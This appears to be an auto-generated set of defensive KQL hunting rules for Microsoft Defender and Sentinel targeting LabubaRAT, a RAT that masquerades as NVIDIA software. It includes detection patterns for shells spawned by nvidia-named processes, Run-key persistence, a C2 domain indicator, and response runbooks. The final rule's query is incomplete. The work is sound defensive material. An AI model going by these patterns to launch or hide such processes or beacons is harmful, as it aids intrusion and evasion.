1) Triage: verify the parent nvidia*.exe signer and path — genuine NVIDIA lives under \Program Files\NVIDIA and is Authenticode-signed by NVIDIA; inspect the child command line for discovery/download activity. 2) Contain: if parent is unsigned/misplaced, isolate host and quarantine the binary. 3) Hunt: check the same host for pipicka.xyz beacons, Run-key persistence, and AV/browser enumeration.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName startswith "nvidia" and InitiatingProcessFileName endswith ".exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName contains "\\nvidia" and ParentProcessName endswith ".exe"
| where NewProcessName endswith "\\cmd.exe" or NewProcessName endswith "\\powershell.exe" or NewProcessName endswith "\\pwsh.exe" or NewProcessName endswith "\\wscript.exe" or NewProcessName endswith "\\cscript.exe" or NewProcessName endswith "\\mshta.exe" or NewProcessName endswith "\\rundll32.exe" or NewProcessName endswith "\\regsvr32.exe"
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

NVIDIA-named executable without valid NVIDIA code signature AIInstallation Medium
Hunts execution of binaries whose filename starts with 'nvidia' but whose embedded company/signer is not NVIDIA — the core file-level masquerade LabubaRAT relies on (impersonating NVIDIA's container runtime toolkit). Flags nvidia-sysruntime.exe and any re-branded variant that fails to chain to NVIDIA's trusted publisher. Rationale: Directly operationalizes the article's 'masquerades as NVIDIA software' premise: Defender's ProcessVersionInfoCompanyName lets us flag nvidia-named binaries whose signer isn't NVIDIA. Sentinel left blank because SecurityEvent 4688 carries no signer/company field to express the mismatch. Cross-checked against: • https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software
ATT&CKT1036.005 T1036.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • OEM/laptop-vendor NVIDIA helper utilities signed under the OEM's name rather than NVIDIA
  • Portable NVIDIA tools run from a user Downloads folder before install
  • Older NVIDIA components with stripped/blank version metadata
  • Internal software-packaging wrappers that re-sign an nvidia launcher with a corporate cert
Suppression filter
| where not(ProcessVersionInfoCompanyName has_any ("Dell","HP","Lenovo","ASUS","Microsoft"))
Response runbook
1) Triage: compute the SHA256 and check reputation; confirm the file is the LabubaRAT loader vs a legitimately OEM-signed helper. 2) Contain: quarantine the binary and isolate the host if the hash is unknown/malicious. 3) Hunt: sweep org-wide for the same hash/filename, then correlate with pipicka.xyz C2 and Run-key persistence on affected hosts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName startswith "nvidia" and FileName endswith ".exe"
| where isempty(ProcessVersionInfoCompanyName) or ProcessVersionInfoCompanyName !has "NVIDIA"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessVersionInfoCompanyName, ProcessVersionInfoProductName, SHA256, ProcessCommandLine
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceProcessEvents
| where TimeGenerated > ago(30d)
| where FileName startswith "nvidia" and FileName endswith ".exe"
| where isempty(ProcessVersionInfoCompanyName) or ProcessVersionInfoCompanyName !has "NVIDIA"
| where AccountName !endswith "$"
| project TimeGenerated, DeviceName, AccountName, FileName, FolderPath, ProcessVersionInfoCompanyName, ProcessVersionInfoProductName, SHA256, ProcessCommandLine
| order by TimeGenerated desc

LabubaRAT user-level autostart persistence (Run key / scheduled task referencing NVIDIA loader) AIInstallation Medium
Hunts Run/RunOnce registry writes or scheduled-task creation that reference the LabubaRAT loader (nvidia-sysruntime) or its C2 (pipicka.xyz), or that are written by an nvidia-named process — the 'user level autostart' persistence the article says LabubaRAT maintains. Rationale: Article explicitly notes LabubaRAT maintains 'user level autostart'; keying Run-key value data on the named loader and pipicka.xyz IOC keeps this tight while the nvidia-writer clause catches renamed variants. Cross-checked against: • https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software
ATT&CKT1547.001 T1053.005
Data sourcesEndpoint.Registry
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Genuine NVIDIA GeForce Experience / driver auto-update writing an nvidia Run entry from \Program Files\NVIDIA
  • Software-deployment tooling staging an nvidia launcher in Run for post-reboot install
  • Backup/imaging solution restoring a legacy Run value
  • Analyst re-adding a known-good nvidia autostart during troubleshooting
Suppression filter
| where not(RegistryValueData has "\\Program Files\\NVIDIA" or RegistryValueData has "\\Program Files (x86)\\NVIDIA")
Response runbook
1) Triage: read the full Run value data and confirm the referenced binary is the unsigned nvidia-sysruntime loader (not \Program Files\NVIDIA). 2) Contain: delete the autostart value/task, quarantine the referenced binary, isolate host. 3) Hunt: check for the same value across the fleet and correlate with pipicka.xyz beaconing and loader execution.
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has @"\CurrentVersion\Run"
| where RegistryValueData has "nvidia-sysruntime" or RegistryValueData has "pipicka.xyz" or (InitiatingProcessFileName startswith "nvidia" and InitiatingProcessFileName endswith ".exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(30d)
| where RegistryKey has @"\CurrentVersion\Run"
| where RegistryValueData has "nvidia-sysruntime" or RegistryValueData has "pipicka.xyz" or ActingProcessName contains "\\nvidia"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, RegistryKey, RegistryValue, RegistryValueData
| order by TimeGenerated desc

Trojanized NVIDIA installer download from non-NVIDIA source AIDelivery Medium
Hunts creation/download of an nvidia-named executable whose mark-of-the-web origin URL is NOT an NVIDIA domain, or that is written to disk by a browser/mail client — the delivery vector for the fake NVIDIA container-runtime installer that drops LabubaRAT. Rationale: The 'masquerades as NVIDIA software' premise implies a fake installer; keying an nvidia-named exe on a non-NVIDIA origin URL (mark-of-the-web) or a browser/mail-client writer surfaces the delivery without alerting on legitimate NVIDIA downloads. Sigma/Datadog omitted because origin-URL is not a standard field for those log shapes. Cross-checked against: • https://www.scworld.com/brief/new-rust-based-rat-named-labubarat-impersonates-nvidia-software
ATT&CKT1566.002 T1204.002 T1036
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Users downloading NVIDIA drivers from a legitimate mirror/CDN not on the allowlist (e.g. an OEM or Steam-hosted redistributable)
  • Internal software portal re-hosting NVIDIA installers on a corporate URL
  • Driver-management tools (Snappy/Chocolatey) fetching nvidia packages
  • Archived nvidia installer copied from a file share and re-tagged with a referrer URL

| where not(FileOriginUrl has_any ("chocolatey.org","steamstatic.com") or InitiatingProcessAccountName endswith "$")
Response runbook
1) Triage: pull FileOriginUrl + referrer and SHA256; confirm the source domain is attacker-controlled and the file is unsigned/non-NVIDIA. 2) Contain: quarantine the file, block the source domain at the proxy, and check whether it was executed. 3) Hunt: search EmailUrlInfo/EmailAttachmentInfo for the same lure, and sweep the fleet for the hash plus subsequent nvidia-sysruntime.exe execution and pipicka.xyz traffic.

| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, FileOriginUrl, FileOriginReferrerUrl, SHA256, InitiatingProcessFileName
